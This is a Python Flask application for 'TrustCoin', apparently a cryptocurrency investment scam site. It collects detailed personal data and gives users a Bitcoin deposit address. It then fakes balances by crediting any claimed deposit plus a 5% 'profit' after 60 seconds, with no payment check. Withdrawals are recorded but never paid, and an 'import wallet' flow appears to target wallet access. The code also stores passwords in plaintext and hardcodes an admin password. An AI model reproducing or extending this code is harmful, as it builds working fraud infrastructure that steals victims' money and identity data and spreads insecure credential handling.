import os
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, date
import random, string

app = Flask(__name__)

# ── Config (works locally and on Render) ─────────────────────────────────
app.secret_key = os.environ.get('SECRET_KEY', 'trustcoin_local_dev_key_2024')
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///trustcoin.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ── Models ────────────────────────────────────────────────────────────────
class User(db.Model):
    id              = db.Column(db.Integer, primary_key=True)
    legal_name      = db.Column(db.String(120), nullable=False)
    dob             = db.Column(db.String(20),  nullable=False)
    email           = db.Column(db.String(120), unique=True, nullable=False)
    country         = db.Column(db.String(80),  nullable=False)
    employment      = db.Column(db.String(50),  nullable=False)
    invested_before = db.Column(db.String(10),  nullable=False)
    income_source   = db.Column(db.String(120), nullable=False)
    username        = db.Column(db.String(20),  unique=True, nullable=False)
    password        = db.Column(db.String(200), nullable=False)
    approved        = db.Column(db.Boolean, default=False)
    wallet_imported = db.Column(db.Boolean, default=False)
    wallet_type     = db.Column(db.String(50),  nullable=True)
    balance         = db.Column(db.Float, default=0.0)
    total_profit    = db.Column(db.Float, default=0.0)
    created_at      = db.Column(db.DateTime, default=datetime.utcnow)

class Transaction(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    user_id    = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    tx_type    = db.Column(db.String(30), nullable=False)
    amount     = db.Column(db.Float, nullable=False)
    status     = db.Column(db.String(20), default='Pending')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class PendingInvestment(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    user_id    = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    amount     = db.Column(db.Float, nullable=False)
    tx_id      = db.Column(db.Integer, nullable=True)
    credited   = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class VisitorLog(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(60))
    page       = db.Column(db.String(200))
    visit_date = db.Column(db.Date, default=date.today)
    arrived_at = db.Column(db.DateTime, default=datetime.utcnow)
    session_id = db.Column(db.String(80))

class QuizWinner(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    username   = db.Column(db.String(80))
    email      = db.Column(db.String(120))
    prize      = db.Column(db.Float)
    category   = db.Column(db.String(40))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    contacted  = db.Column(db.Boolean, default=False)

class HelpRequest(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    req_type   = db.Column(db.String(20))
    email      = db.Column(db.String(120))
    message    = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

# ── Constants ─────────────────────────────────────────────────────────────
ADMIN_PASSWORD = 'PASS@Billionsforme@001'
ADMIN_SECRET   = '/admin-secure-login-tc2024'
BTC_ADDRESS    = os.environ.get('BTC_ADDRESS', 'YOUR_BTC_WALLET_ADDRESS_HERE')

def generate_verify_code():
    return ''.join(random.choices(string.digits, k=6))

# ── Traffic logging ───────────────────────────────────────────────────────
@app.before_request
def log_visitor():
    skip = ['static', 'check_pending', 'admin_login', 'admin_dashboard',
            'approve_user', 'disapprove_user', 'mark_contacted', 'admin_logout']
    if request.endpoint and request.endpoint not in skip:
        sid = session.get('visitor_sid')
        if not sid:
            sid = os.urandom(16).hex()
            session['visitor_sid'] = sid
        try:
            db.session.add(VisitorLog(
                ip_address=request.remote_addr,
                page=request.path,
                visit_date=date.today(),
                arrived_at=datetime.utcnow(),
                session_id=sid
            ))
            db.session.commit()
        except Exception:
            db.session.rollback()

# ── Public routes ─────────────────────────────────────────────────────────
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        session['signup_step1'] = request.get_json()
        return jsonify({'success': True})
    return render_template('signup.html')

@app.route('/complete-registration', methods=['GET', 'POST'])
def complete_registration():
    if 'signup_step1' not in session:
        return redirect(url_for('signup'))
    if request.method == 'POST':
        data = request.get_json()
        if User.query.filter_by(username=data.get('username', '')).first():
            return jsonify({'success': False, 'error': 'USERNAME_TAKEN'})
        session['signup_step2'] = data
        return jsonify({'success': True})
    return render_template('complete_registration.html')

@app.route('/verify-robot', methods=['GET', 'POST'])
def verify_robot():
    if 'signup_step1' not in session or 'signup_step2' not in session:
        return redirect(url_for('signup'))
    if request.method == 'POST':
        data = request.get_json()
        if data.get('action') == 'generate':
            code = generate_verify_code()
            session['verify_code'] = code
            return jsonify({'success': True, 'code': code})
        if data.get('action') == 'verify':
            if data.get('code', '').strip() == session.get('verify_code'):
                s1 = session.pop('signup_step1')
                s2 = session.pop('signup_step2')
                session.pop('verify_code', None)
                new_user = User(
                    legal_name=s1['legal_name'], dob=s1['dob'],
                    email=s1['email'], country=s1['country'],
                    employment=s1['employment'],
                    invested_before=s1['invested_btc'],
                    income_source=s1['income_source'],
                    username=s2['username'], password=s2['password']
                )
                db.session.add(new_user)
                db.session.commit()
                return jsonify({'success': True})
            return jsonify({'success': False, 'error': 'INVALID_CODE'})
    return render_template('verify_robot.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.get_json()
        user = User.query.filter_by(
            username=data.get('username', '').strip(),
            password=data.get('password', '').strip()
        ).first()
        if user:
            session['user_id']  = user.id
            session['username'] = user.username
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': 'INVALID_USERNAME_OR_PASSWORD'})
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

# ── Info pages ────────────────────────────────────────────────────────────
@app.route('/privacy-policy')
def privacy_policy():
    return render_template('privacy_policy.html')

@app.route('/terms-of-service')
def terms_of_service():
    return render_template('terms_of_service.html')

@app.route('/law')
def law():
    return render_template('law.html')

@app.route('/faqs')
def faqs():
    return render_template('faqs.html')

@app.route('/help-center', methods=['GET', 'POST'])
def help_center():
    if request.method == 'POST':
        d = request.get_json()
        db.session.add(HelpRequest(req_type='help',
            email=d.get('email', ''), message=d.get('message', '')))
        db.session.commit()
        return jsonify({'success': True})
    return render_template('help_center.html')

@app.route('/contact-us', methods=['GET', 'POST'])
def contact_us():
    if request.method == 'POST':
        d = request.get_json()
        db.session.add(HelpRequest(req_type='contact',
            email=d.get('email', ''), message=d.get('message', '')))
        db.session.commit()
        return jsonify({'success': True})
    return render_template('contact_us.html')

# ── Dashboard ─────────────────────────────────────────────────────────────
@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = User.query.get(session['user_id'])
    txs  = Transaction.query.filter_by(user_id=user.id)\
               .order_by(Transaction.created_at.desc()).limit(20).all()
    return render_template('dashboard.html', user=user,
                           transactions=txs, btc_address=BTC_ADDRESS)

@app.route('/import-wallet', methods=['GET', 'POST'])
def import_wallet():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        d    = request.get_json()
        user = User.query.get(session['user_id'])
        user.wallet_imported = True
        user.wallet_type     = d.get('wallet_type', '')
        db.session.commit()
        return jsonify({'success': True})
    return render_template('import_wallet.html')

@app.route('/invest', methods=['POST'])
def invest():
    if 'user_id' not in session:
        return jsonify({'success': False})
    d      = request.get_json()
    amount = float(d.get('amount', 0))
    if amount < 100:
        return jsonify({'success': False, 'error': 'MIN_AMOUNT'})
    user = User.query.get(session['user_id'])
    tx   = Transaction(user_id=user.id, tx_type='Invest',
                       amount=amount, status='Pending')
    db.session.add(tx)
    db.session.commit()
    db.session.add(PendingInvestment(user_id=user.id,
                                     amount=amount, tx_id=tx.id))
    db.session.commit()
    return jsonify({'success': True, 'btc_address': BTC_ADDRESS, 'tx_id': tx.id})

@app.route('/confirm-investment', methods=['POST'])
def confirm_investment():
    if 'user_id' not in session:
        return jsonify({'success': False})
    d      = request.get_json()
    tx_id  = int(d.get('tx_id', 0))
    amount = float(d.get('amount', 0))
    tx = Transaction.query.get(tx_id)
    if tx:
        tx.amount = amount
    pi = PendingInvestment.query.filter_by(
        user_id=session['user_id'], tx_id=tx_id, credited=False).first()
    if pi:
        pi.amount = amount
    db.session.commit()
    # Credit balance after 60 seconds
    session['pending_credit'] = {
        'tx_id':  tx_id,
        'amount': amount,
        'due':    datetime.utcnow().timestamp() + 60
    }
    return jsonify({'success': True})

@app.route('/check-pending')
def check_pending():
    if 'user_id' not in session:
        return jsonify({'credited': False})
    pc = session.get('pending_credit')
    if pc and datetime.utcnow().timestamp() >= float(pc['due']):
        user = User.query.get(session['user_id'])
        amt  = float(pc['amount'])
        user.balance      += amt
        user.total_profit += amt * 0.05   # show small profit
        tx = Transaction.query.get(pc['tx_id'])
        if tx:
            tx.status = 'Approved'
        db.session.commit()
        session.pop('pending_credit', None)
        return jsonify({
            'credited':     True,
            'new_balance':  user.balance,
            'total_profit': user.total_profit
        })
    return jsonify({'credited': False})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    if 'user_id' not in session:
        return jsonify({'success': False})
    d      = request.get_json()
    amount = float(d.get('amount', 0))
    user   = User.query.get(session['user_id'])
    db.session.add(Transaction(user_id=user.id, tx_type='Withdraw',
                               amount=amount, status='Processing'))
    db.session.commit()
    return jsonify({'success': True})

# ── Quiz ──────────────────────────────────────────────────────────────────
@app.route('/quiz')
def quiz():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('quiz.html')

@app.route('/quiz/submit-winner', methods=['POST'])
def submit_winner():
    if 'user_id' not in session:
        return jsonify({'success': False})
    d = request.get_json()
    db.session.add(QuizWinner(
        username=d.get('username', ''),
        email=d.get('email', ''),
        prize=float(d.get('prize', 0)),
        category=d.get('category', '')
    ))
    db.session.commit()
    return jsonify({'success': True})

# ── Admin ─────────────────────────────────────────────────────────────────
@app.route(ADMIN_SECRET, methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        d = request.get_json()
        if d.get('password') == ADMIN_PASSWORD:
            session['admin'] = True
            return jsonify({'success': True})
        return jsonify({'success': False})
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('home'))
    users   = User.query.order_by(User.created_at.desc()).all()
    winners = QuizWinner.query.order_by(QuizWinner.created_at.desc()).all()
    msgs    = HelpRequest.query.order_by(HelpRequest.created_at.desc()).all()
    today_visits = VisitorLog.query.filter_by(visit_date=date.today()).count()
    total_visits = VisitorLog.query.count()
    from sqlalchemy import func
    daily = db.session.query(
        VisitorLog.visit_date, func.count(VisitorLog.id)
    ).group_by(VisitorLog.visit_date)\
     .order_by(VisitorLog.visit_date.desc()).limit(7).all()
    recent_logs = VisitorLog.query.order_by(
        VisitorLog.arrived_at.desc()).limit(30).all()
    return render_template('admin_dashboard.html',
        users=users, winners=winners, msgs=msgs,
        today_visits=today_visits, total_visits=total_visits,
        daily=daily, recent_logs=recent_logs)

@app.route('/admin/approve/<int:uid>', methods=['POST'])
def approve_user(uid):
    if not session.get('admin'):
        return jsonify({'success': False})
    u = User.query.get(uid)
    u.approved = True
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/disapprove/<int:uid>', methods=['POST'])
def disapprove_user(uid):
    if not session.get('admin'):
        return jsonify({'success': False})
    u = User.query.get(uid)
    u.approved = False
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/mark-contacted/<int:wid>', methods=['POST'])
def mark_contacted(wid):
    if not session.get('admin'):
        return jsonify({'success': False})
    w = QuizWinner.query.get(wid)
    w.contacted = True
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('home'))

# ── Entry point ───────────────────────────────────────────────────────────
if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
